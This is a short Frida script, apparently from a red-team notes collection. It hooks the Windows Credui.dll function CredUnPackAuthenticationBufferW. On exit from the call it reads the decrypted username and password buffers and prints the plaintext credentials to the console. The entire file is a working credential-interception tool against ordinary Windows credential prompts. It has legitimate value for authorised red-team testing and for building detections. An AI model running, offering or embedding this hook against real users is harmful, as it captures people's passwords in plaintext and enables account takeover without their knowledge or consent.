/*
    Name: 
    Description: 
    Author: @RedTeamNotes
*/
var username;
var password;
var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")
Interceptor.attach(CredUnPackAuthenticationBufferW, {
    onEnter: function (args) {
        // Credentials here are still encrypted
        /*
            CREDUIAPI BOOL CredUnPackAuthenticationBufferW(
                0 DWORD  dwFlags,
                1 PVOID  pAuthBuffer,
                2 DWORD  cbAuthBuffer,
                3 LPWSTR pszUserName,
                4 DWORD  *pcchMaxUserName,
                5 LPWSTR pszDomainName,
                6 DWORD  *pcchMaxDomainName,
                7 LPWSTR pszPassword,
                8 DWORD  *pcchMaxPassword
            );        
        */
        username = args[3];
        password = args[7];
    },
    onLeave: function (result)
    {
        // Credentials are now decrypted
        var user = username.readUtf16String()
        var pass = password.readUtf16String()

        if (user && pass)
        {
            console.log("\n+ Intercepted Credentials\n" + user + ":" + pass)
        }
    }
});